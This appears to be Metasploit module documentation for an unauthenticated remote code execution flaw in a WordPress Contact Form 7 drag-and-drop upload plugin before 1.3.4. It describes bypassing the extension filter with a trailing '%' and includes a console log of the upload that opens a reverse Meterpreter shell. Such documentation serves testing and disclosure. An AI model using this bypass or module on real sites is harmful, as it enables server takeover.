## Vulnerable Application

Drag and Drop Multiple File Upload - Contact Form 7 prior to version 1.3.4 contain a remote file upload
functionality, but is bound by a file extension whitelist.  However, this can be bypassed by appending
`%` at the end of the file, so `backdoor.php%` will pass the filter. No authentication is required for
exploitation.

At the time of writing this plugin has 20,000+ installs, and no mention of the vulnerability in the
changelog.

Plugin can be downloaded from [here](https://mega.nz/file/aQUClQKC#ZYeiTYSrPuRnwwlRavy4cqf_EXs34Tkq6KQig2RcOas).

`php-mbstring` is required for the plugin to work correctly, or else a `500` error will result in the
server logs.  No check is performed on plugin install for this.

`Contact Form 7` is also a required plugin to be installed.

No additional steps are required for exploitation such as configuring the plugins, or adding
a Contact Form (with drag and drop) to a page/post.

## Verification Steps

  1. Install wordpress and the plugins
  2. Start msfconsole
  3. Do: ```use exploits/multi/http/wp_dnd_mul_file_rce```
  4. Do: ```set rhosts```
  5. Do: ```run```
  6. You should get a shell.

## Options

## Scenarios

### Wordpress 5.4.1 with Drag and Drop Multiple File Upload - Contact Form 7 v1.3.3.2 and Contact Form 7 v5.1.9 on Ubuntu 20.04

  ```
resource (dnd.rb)> use exploits/multi/http/wp_dnd_mul_file_rce
resource (dnd.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (dnd.rb)> set verbose true
verbose => true
resource (dnd.rb)> check
[*] Checking /wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt
[*] Found version 1.3.3.2 in the plugin
[*] 2.2.2.2:80 - The target appears to be vulnerable.
resource (dnd.rb)> exploit
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Getting nonce
[*] Nonce: 392e81074e
[*] Attempting payload upload
[+] Payload uploaded successful
[*] Attempting to trigger at well known location
[*] Sending stage (38288 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:56032) at 2020-05-30 20:57:12 -0400
[+] Deleted ReasCENA.php

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : wordpress2004
OS          : Linux wordpress2004 5.4.0-33-generic #37-Ubuntu SMP Thu May 21 12:53:59 UTC 2020 x86_64
Meterpreter : php/linux
  ```
